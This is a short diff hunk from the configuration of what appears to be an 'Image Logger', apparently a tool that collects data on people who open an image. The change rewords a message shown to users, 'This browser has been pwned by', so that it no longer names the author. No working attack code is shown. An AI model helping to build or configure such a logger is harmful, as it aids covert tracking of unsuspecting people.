@@ -25,7 +25,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by ItzIcyGaming's Image Logger.", # Message to show
+        "message": "This browser has been pwned by an Image Logger.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
